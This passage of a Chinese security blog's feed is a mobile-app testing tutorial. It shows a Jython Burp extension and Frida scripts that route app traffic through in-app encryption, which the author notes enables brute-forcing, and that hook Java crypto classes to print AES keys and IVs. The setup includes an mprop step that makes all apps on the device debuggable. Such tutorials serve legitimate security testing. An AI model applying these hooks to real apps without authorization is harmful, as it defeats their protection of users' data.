src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\gif111111111.gif" alt="1580905769487"></p><p>接下来实现自定义插件实现在<code>reperter</code>、<code>scanner</code>、<code>intruder</code>模板中自动加密请求包和解密返回包。</p><p>为了让处理加解密数据更方便，所以就改变了一下服务端加解密的方式。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580972196130.png" alt="1580972196130"></p><p>这里我用的python编写插件。所以需要安装jython</p><p>推荐安装最新版的<code>jython-installer-2.7.2b3.jar</code></p><p><a href="https://repo1.maven.org/maven2/org/python/jython-installer/2.7.2b3/jython-installer-2.7.2b3.jar" target="_blank" rel="noopener">https://repo1.maven.org/maven2/org/python/jython-installer/2.7.2b3/jython-installer-2.7.2b3.jar</a></p><p>同时使用jython自带的pip安装Pyro4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyro4</span><br></pre></td></tr></table></figure><p>burp中配置最新安装好pyro4的路径。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580969785849.png" alt="1580969785849"></p><p>然后用python编写burp插件。</p><p>申明一个类，继承于<code>IBurpExtender</code>和<code>IHttpListener</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`class` `BurpExtender(IBurpExtender, IHttpListener)`</span><br></pre></td></tr></table></figure><p>重写<code>registerExtenderCallbacks</code>和<code>processHttpMessage</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks = callbacks</span><br><span class="line">        self._helpers = callbacks.getHelpers()</span><br><span class="line">        self._callbacks.setExtensionName(&quot;fuck encrypt by Uknow!&quot;)</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">    # tool https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks</span><br><span class="line">    if toolFlag == 64 or toolFlag == 16 or toolFlag == 32: # TOOL_REPEATER     TOOL_SCANNER     TOOL_INTRUDER</span><br><span class="line">        request = messageInfo.getRequest()</span><br><span class="line">        analyzedRequest = self._helpers.analyzeRequest(request)</span><br><span class="line">        headers = analyzedRequest.getHeaders()</span><br><span class="line">        if not messageIsRequest:</span><br><span class="line">            response = messageInfo.getResponse()</span><br><span class="line">            analyzedResponse = self._helpers.analyzeResponse(response)</span><br><span class="line">            messageInfo.setResponse(self.decrypt(analyzedResponse, response))</span><br><span class="line">        # elif toolFlag != 4:</span><br><span class="line">        else:</span><br><span class="line">            messageInfo.setRequest(self.encrypt(analyzedRequest, request))</span><br></pre></td></tr></table></figure><p>对着toolFlag一顿if是为了过滤Burp的模块，判断他是从哪过来的，这里是过滤了三个：<code>reperter</code>、<code>scanner</code>、<code>intruder</code>，抓包过来的无需处理，如果你处理了那APP就不能正常收发数据了。<br><code>self.decrypt</code>和<code>self.encrypt</code>就是去跟<code>Brida</code>开的端口交换数据，处理加解密：</p><pre><code>def decrypt(self, RequestOrResponse,raw):    uri = &apos;PYRO:BridaServicePyro@localhost:9999&apos;    pp = Pyro4.Proxy(uri)    body = raw[RequestOrResponse.getBodyOffset():]    newbody = body.tostring()    args = []    args.append(newbody.encode(&apos;hex&apos;))    ret = pp.callexportfunction(&apos;contextcustom4&apos;,args)    ret = self._helpers.bytesToString(ret).decode(&apos;hex&apos;)    return self._helpers.buildHttpMessage(RequestOrResponse.getHeaders(), ret)def encrypt(self, RequestOrResponse,raw):    uri = &apos;PYRO:BridaServicePyro@localhost:9999&apos;    pp = Pyro4.Proxy(uri)    body = raw[RequestOrResponse.getBodyOffset():]    newbody = body.tostring()    args = []    args.append(newbody.encode(&apos;hex&apos;))    ret = pp.callexportfunction(&apos;contextcustom1&apos;,args)    ret = self._helpers.bytesToString(ret).decode(&apos;hex&apos;)    return self._helpers.buildHttpMessage(RequestOrResponse.getHeaders(), ret)</code></pre><p>用<code>callexportfunction</code>来调用你刚才js脚本里<code>rpc.exports</code>里的函数，参数是函数名和参数列表。</p><p>完整代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IHttpListener</span><br><span class="line">from burp import IHttpRequestResponse</span><br><span class="line">from burp import IResponseInfo</span><br><span class="line">from burp import IProxyListener</span><br><span class="line">import Pyro4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &apos;uknowsec.cn&apos;</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender,IHttpListener,IHttpRequestResponse, IProxyListener):</span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks = callbacks</span><br><span class="line">        self._helpers = callbacks.getHelpers()</span><br><span class="line">        self._callbacks.setExtensionName(&quot;fuck encrypt by Uknow!&quot;)</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">    def decrypt(self, RequestOrResponse,raw):</span><br><span class="line">        uri = &apos;PYRO:BridaServicePyro@localhost:9999&apos;</span><br><span class="line">        pp = Pyro4.Proxy(uri)</span><br><span class="line">        body = raw[RequestOrResponse.getBodyOffset():]</span><br><span class="line">        newbody = body.tostring()</span><br><span class="line">        args = []</span><br><span class="line">        args.append(newbody.encode(&apos;hex&apos;))</span><br><span class="line">        ret = pp.callexportfunction(&apos;contextcustom4&apos;,args)</span><br><span class="line">        ret = self._helpers.bytesToString(ret).decode(&apos;hex&apos;)</span><br><span class="line">        return self._helpers.buildHttpMessage(RequestOrResponse.getHeaders(), ret)</span><br><span class="line"> </span><br><span class="line">    def encrypt(self, RequestOrResponse,raw):</span><br><span class="line">        uri = &apos;PYRO:BridaServicePyro@localhost:9999&apos;</span><br><span class="line">        pp = Pyro4.Proxy(uri)</span><br><span class="line">        body = raw[RequestOrResponse.getBodyOffset():]</span><br><span class="line">        newbody = body.tostring()</span><br><span class="line">        args = []</span><br><span class="line">        args.append(newbody.encode(&apos;hex&apos;))</span><br><span class="line">        ret = pp.callexportfunction(&apos;contextcustom1&apos;,args)</span><br><span class="line">        ret = self._helpers.bytesToString(ret).decode(&apos;hex&apos;)</span><br><span class="line">        return self._helpers.buildHttpMessage(RequestOrResponse.getHeaders(), ret)</span><br><span class="line"></span><br><span class="line">    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">        # tool https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks</span><br><span class="line">        if toolFlag == 64 or toolFlag == 16 or toolFlag == 32: # TOOL_REPEATER     TOOL_SCANNER     TOOL_INTRUDER</span><br><span class="line">            request = messageInfo.getRequest()</span><br><span class="line">            analyzedRequest = self._helpers.analyzeRequest(request)</span><br><span class="line">            headers = analyzedRequest.getHeaders()</span><br><span class="line">            if not messageIsRequest:</span><br><span class="line">                response = messageInfo.getResponse()</span><br><span class="line">                analyzedResponse = self._helpers.analyzeResponse(response)</span><br><span class="line">                messageInfo.setResponse(self.decrypt(analyzedResponse, response))</span><br><span class="line">            # elif toolFlag != 4:</span><br><span class="line">            else:</span><br><span class="line">                messageInfo.setRequest(self.encrypt(analyzedRequest, request))</span><br></pre></td></tr></table></figure><p>然后加载就可以在<code>reperter</code>、<code>scanner</code>、<code>intruder</code>模块中实现自动加密解密了。操作如下图。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\gif111211111.gif" alt="1580905769487"></p><p>比如如上场景可直接进行爆破。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\gif111311111.gif" alt="1580905769487"></p><p>自动以插件也可以使用Java编写，可以根据文章前文给出的官方文档给出的示例进行修改。</p><h2><span id="lxhtoolhttpdecrypt">lxhToolHTTPDecrypt</span></h2><p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt" target="_blank" rel="noopener">https://github.com/lyxhh/lxhToolHTTPDecrypt</a></p><p>HTTP Decrypt 提供了Finds Hooks模块，可以在不逆向不脱壳的情况下快速的找到APP所使用的加解密算法，而toBurp模块提供了直接使用APP内的方法进行加解密，而不需自己动手敲代码，对于整体POST加密更是提供了自动化加解密功能，可以实现Burp一条龙，Burp Scanner ，Intruder自动加解密。</p><ol><li>python3 app.py</li><li>Android_frida_server 运行</li><li>转发frida端口。</li><li>打开HTTP Decrypt页面，如果在Start界面出现应用包名列表信息则可正常使用其他功能，如果不行，刷新一下看看控制台出现的信息。</li></ol><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580977948133.png" alt="1580977948133"></p><h3><span id="hooks">Hooks</span></h3><p>填写字符串，将类名与你填写的字符串匹配，并Hooks类下的所有方法，hook多个类名，回车换行。</p><p>在APP中进行操作，尽量进行多次操作，让脚本hook到所有方法。</p><p>如下图，这里找到了加密方法为<code>com.ese.http.encrypt.AesEncryptionBase64.encrypt</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580978070314.png" alt="1580978070314"></p><h3><span id="stack">Stack</span></h3><p>像Brida一样也可以显示Hooks打印的堆栈。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580978156034.png" alt="1580978156034"></p><h3><span id="finds">Finds</span></h3><p>根据字符串，查找类，匹配到类，将类下的方法都打印出来。多个查找回车换行继续写。提供了过滤机制。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580979123411.png" alt="1580979123411"></p><p>匹配的不是很准确，可能是我姿势有问题，但是我们可以自己去反编译或者通过hook来判断哪个是加解密方法。</p><h3><span id="toburp">toBurp</span></h3><p>添入我们得到加解密方法。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580979268369.png" alt="1580979268369"></p><p>然后点击Confirm按钮，之后再点击Add按钮，将方法的信息添加到左边的info里面去，因为加解密方法有两个参数，无法使用HTTPDecrypt自动的生成的脚本（自动生成的脚本只能适应一个参数），所以 我们需要自己写一些代码，接下来我们点击Generate export static script按钮。（因为方法类型是静态的所以选择static按钮，动态的选择instance，如果你很熟悉frida，点哪个都无所谓。）</p><p>HTTPDecrypt会将一些代码生成在Custom选项卡中，如下：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580979877144.png" alt="1580979877144"></p><p>像Brida修改代码，添加key值。encrypt方法的第一个参数是一个固定值key，通过反编译和hook分析可以得到。第二个参数为加密内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&apos;use strict&apos;;</span><br><span class="line"></span><br><span class="line">var rpc_result = null;</span><br><span class="line">var rpc_result_ios = null;</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tag3c57a19c2806a2b4d3f028f23c7d2f4f02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                var key = &quot;9876543210123456&quot;;</span><br><span class="line">// var context = Java.use(&apos;android.app.ActivityThread&apos;).currentApplication().getApplicationContext();</span><br><span class="line">                var AesEncryptionBase64bc9333b9adb0ceb7cc6c929d900e3365 = Java.use(&quot;com.ese.http.encrypt.AesEncryptionBase64&quot;);</span><br><span class="line">                rpc_result = AesEncryptionBase64bc9333b9adb0ceb7cc6c929d900e3365.encrypt(key, arg0);</span><br><span class="line">                // send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&apos;-cusoto0oom0sc0ri0pt-&apos;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tag3c57a19c2806a2b4d3f028f23c7d2f4f02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">// Added Function </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的方法修改解密方法。如图</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580981397792.png" alt="1580981397792"></p><p>loadscript加载脚本。</p><p>这样我们可以得到两个方法名，和brida中的contextcustom一样。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580981451928.png" alt="1580981451928"></p><p>然后我们将这两个方法名添入burp插件配置项里</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580981619949.png" alt="1580981619949"></p><p>同样就可以通过右键菜单栏进行加解密了。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\gif111411111.gif" alt="1580905769487"></p><p>他也具有自动加解密的功能，但是目前只能对整个请求包进行加解密不能匹配到需要加解密的数据。</p><p>通过burp发给服务端的数据可以看到，在看起自动加解密后他把整个请求body进行了加密，跟服务端验证不符合，所以存在一定的局限性。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1580982022808.png" alt="1580982022808"></p><p>通过修改服务端代码，和请求包格式。</p><p>我们改成客户端把整个请求包body进行加密，给后端验证的方法。体验一下自动加解密。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\gif111511111.gif" alt="1580905769487"></p><h2><span id="对比总结">对比总结</span></h2><ul><li>Brida的插桩功能好像有点不好使，lxhToolHTTPDecrypt的hook功能对APP进行多次操作后，效果还是挺好的。但定位加解密方法还是要人工的去分析，工具只是辅助作用。</li><li>Brida和lxhToolHTTPDecrypt的右键菜单功能其实是相同的原理，绑定函数去调用函数进行加解密得到返回值</li><li>Brida灵活性强一点，可以自定义编写插件。但是这也是比较麻烦的一点，对于不熟悉BURP插件编写的使用者是一个难点，lxhToolHTTPDecrypt方便一点，他不需要自己去写插件对数据进行处理，但是他只能对整个body进行自动加解密，存在一定局限性。而在Brida中可以在编写脚本的过程中对需要加解密的内容进行灵活的操作，lxhToolHTTPDecrypt目前还在不断的更新，可能作者后面会解决这个问题。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;brida&quot;&gt;Brida&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;brida简介&quot;&gt;Brida简介&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;Brida是BurpSuite的一个插件，它可以将Burp和Frida结合起来使用，可以在 BurpSuite中直
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-hook实战二</title>
    <link href="https://uknowsec.cn/posts/notes/frida-hook%E5%AE%9E%E6%88%98%E4%BA%8C.html"/>
    <id>https://uknowsec.cn/posts/notes/frida-hook实战二.html</id>
    <published>2020-01-07T15:38:13.000Z</published>
    <updated>2020-01-07T15:39:13.265Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="traceviewfrida">Traceview+frida</span></h3><p>TraceView 是 Android SDK 中内置的一个工具，它可以加载 <strong>trace</strong> 文件，用图形的形式展示<strong>代码的执行时间、次数及调用栈</strong>。</p><h4><span id="利用mprop工具修改当前手机应用都可以调试">利用mprop工具修改当前手机应用都可以调试</span></h4><p>​    使用DDMS时，只能看到手机，看不到进程信息，这样我们就不能获取指定进程的信息</p><p>​    如果需要调试android 的程序，以下两个条件满足一个就行。第一是apk的配置文件内的AndroidManifest.xml的 android:debuggable=”true”，第二就是/default.prop中ro.debuggable=1。两种方式第一种通常是解包添加属性再打包，随着加壳软件以及apk校验等，容易出现安装包异常。第二种由于一般的手机发布时ro.debuggable一般是0 也就是不允许调试，通过修改rom的办法在手机上比较麻烦，需要刷机等等，模拟器上一般是vmdk的虚拟机，也没法修改rom。</p><p>​    这里我们可以直接用mprop这个工具，可以直接修改android属性。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578290999051.png" alt="1578290999051"></p><p>同样有不同的版本，通过adb上传到模拟机，修改属性值。</p><p>arm:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb push .\libs\armeabi-v7a\mprop /data/local/tmp/</span><br><span class="line">adb shell &quot;chmod 755 /data/local/tmp/mprop&quot;</span><br><span class="line">adb shell &quot;/data/local/tmp/mprop&quot;</span><br><span class="line">adb shell &quot;setprop ro.debuggable 1&quot;</span><br></pre></td></tr></table></figure><p>x86:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb push .\libs\x86\mprop /data/local/tmp/</span><br><span class="line">adb shell &quot;chmod 755 /data/local/tmp/mprop&quot;</span><br><span class="line">adb shell &quot;/data/local/tmp/mprop&quot;</span><br><span class="line">adb shell &quot;setprop ro.debuggable 1&quot;</span><br></pre></td></tr></table></figure><p>这样我们就能看到进行信息了</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578291249889.png" alt="1578291249889"></p><h4><span id="traceview-追踪函数">TraceView 追踪函数</span></h4><p>这里用到的是DDMS中的traceview工具，直接下载android-sdk工具包，运行里面的ddms.bat即可。</p><p>如图选定进程名，选择Trace based profiling。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578291346817.png" alt="1578291346817"></p><p>触发APP条件事件（比如Click或者刷新）生成.trace文件，这样我们就可以看到整个用堆栈过程。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578305250868.png" alt="1578305250868"></p><p>对比AES的解密实现，只需要如下三个点得到，key、模式和iv值就行了。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1578292369510.png" alt="1578292369510"></p><p>key值和iv值是构造函数，根据hook构造函数的方法，要用到<code>$init</code>，并且要<code>return this.$init(arg1,arg2)</code>调用原始的函数实现，同时<code>IvParameterSpec</code>方法的参数是一个比特数组的重载函数。</p><p>Java中比特数组表示为<code>[B</code>，其他类型的数组如下表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Z = boolean</span><br><span class="line">[B = byte</span><br><span class="line">[S = short</span><br><span class="line">[I = int</span><br><span class="line">[J = long</span><br><span class="line">[F = float</span><br><span class="line">[D = double</span><br><span class="line">[C = char</span><br><span class="line">[L = any non-primitives(Object)</span><br></pre></td></tr></table></figure><p>在frida利用如下方式输出比特数组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (i=0;i&lt;arg1.length;i++)</span><br><span class="line">   &#123;</span><br><span class="line">       b=(arg1[i]&gt;&gt;&gt;0)&amp;0xff;</span><br><span class="line">       n=b.toString(16);</span><br><span class="line">       hexstr += (&quot;00&quot; + n).slice(-2)+&quot; &quot;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>完整jscode:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Function to hook is defined here</span></span><br><span class="line">    <span class="keyword">var</span> UtiEncrypt = Java.use(<span class="string">'com.bianlidai123.bc.encrypt.UtiEncrypt'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Whenever button is clicked</span></span><br><span class="line">    UtiEncrypt.decryptAES.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg1</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Show a message to know that the function got called</span></span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">       <span class="keyword">var</span> sign=<span class="keyword">this</span>.decryptAES(arg1);</span><br><span class="line">             </span><br><span class="line">       send(<span class="string">"arg1:"</span>+arg1);</span><br><span class="line">       send(<span class="string">"sign:"</span>+sign);</span><br><span class="line">       <span class="keyword">return</span> sign;</span><br><span class="line">       </span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> Cipher = Java.use(<span class="string">'javax.crypto.Cipher'</span>);</span><br><span class="line">    Cipher.getInstance.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg1</span>) </span>&#123;</span><br><span class="line">         <span class="keyword">var</span> sign2=<span class="keyword">this</span>.getInstance(arg1);</span><br><span class="line">         send(<span class="string">"Instance:"</span>+arg1);</span><br><span class="line">         <span class="keyword">return</span> sign2;</span><br><span class="line">    </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> SecretKeySpec = Java.use(<span class="string">'javax.crypto.spec.SecretKeySpec'</span>);</span><br><span class="line">    SecretKeySpec.$init.overload(<span class="string">'[B'</span>, <span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg1,arg2</span>) </span>&#123;</span><br><span class="line">     hexstr=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;arg1.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(arg1[i]&gt;&gt;&gt;<span class="number">0</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">        n=b.toString(<span class="number">16</span>);</span><br><span class="line">        hexstr += (<span class="string">"00"</span> + n).slice(<span class="number">-2</span>)+<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        send(<span class="string">"Key: "</span> + hexstr);</span><br><span class="line">      <span class="comment">//send("init1:"+arg1+arg2);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.$init(arg1,arg2);</span><br><span class="line">    </span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> IvParameterSpec = Java.use(<span class="string">'javax.crypto.spec.IvParameterSpec'</span>);</span><br><span class="line">    IvParameterSpec.$init.overload(<span class="string">'[B'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg1</span>) </span>&#123;</span><br><span class="line">    hexstr=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;arg1.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=(arg1[i]&gt;&gt;&gt;<span class="number">0</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">        n=b.toString(<span class="number">16</span>);</span><br><span class="line">        hexstr += (<span class="string">"00"</span> + n).slice(<span class="number">-2</span>)+<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        send(<span class="string">"Iv: "</span> + hexstr);</span><br><span class="line">      <span class="comment">//send("init4:"+arg1);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.$init(arg1);</span><br><span class="line">    </span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3><span id="hook-java原生算法同时打印调用堆栈">hook java原生算法同时打印调用堆栈</span></h3><p>如下脚本可以hook java原生MD5、MAC、DES、AES、RSA加密算法并打印出调用堆栈，简单暴力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 